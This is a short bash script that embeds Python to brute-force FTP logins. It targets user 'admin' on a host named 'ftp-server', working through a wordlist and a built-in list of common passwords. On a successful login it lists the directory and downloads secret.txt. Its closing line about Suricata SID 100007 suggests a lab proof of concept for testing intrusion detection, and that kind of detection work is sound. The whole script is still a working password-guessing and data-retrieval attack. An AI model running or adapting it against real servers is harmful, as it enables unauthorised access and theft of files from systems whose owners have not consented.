#!/usr/bin/env bash
# Brute Force - FTP brute force using Python ftplib (no hydra dependency)

echo "[*] Brute Force - FTP PoC"
echo "[*] Target: ftp-server:21"
echo ""

python3 -c "
from ftplib import FTP, error_perm
import time

HOST = 'ftp-server'
PORT = 21
USERNAME = 'admin'
WORDLIST = '/app/wordlists/common.txt'

def load_wordlist():
    try:
        with open(WORDLIST) as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f'[!] Wordlist not found at {WORDLIST}, using inline list')
        return [
            'password', '123456', 'admin', 'letmein', 'welcome',
            'monkey', 'dragon', 'master', 'qwerty', 'login',
            'admin123', 'abc123', 'password1', 'iloveyou', 'sunshine',
        ]

passwords = load_wordlist()
print(f'[*] Loaded {len(passwords)} passwords')
print(f'[*] Starting FTP brute force against {USERNAME}@{HOST}:{PORT}')
print()

found = False
start = time.time()

for i, pwd in enumerate(passwords, 1):
    try:
        ftp = FTP()
        ftp.connect(HOST, PORT, timeout=2)
        ftp.login(USERNAME, pwd)
        elapsed = time.time() - start
        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> SUCCESS!')
        print()
        print(f'[+] FTP Password found: {pwd}')
        print(f'[+] Attempts: {i}')
        print(f'[+] Time: {elapsed:.1f}s')

        # List files
        print(f'[+] FTP directory listing:')
        files = ftp.nlst()
        for f_name in files:
            print(f'    {f_name}')

        # Try to read secret.txt
        if 'secret.txt' in files:
            print()
            print('[+] Found secret.txt! Downloading...')
            content = []
            ftp.retrlines('RETR secret.txt', content.append)
            print(f'[+] Content: {chr(10).join(content)}')

        ftp.quit()
        found = True
        break
    except error_perm:
        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> FAILED')
    except Exception as e:
        print(f'  [{i:3d}/{len(passwords)}] {pwd:20s} -> ERROR: {e}')
    time.sleep(0.05)

if not found:
    elapsed = time.time() - start
    print()
    print(f'[-] Password not found ({len(passwords)} attempts, {elapsed:.1f}s)')

print()
print('[*] Attack complete. Check Suricata alerts for SID 100007.')
"
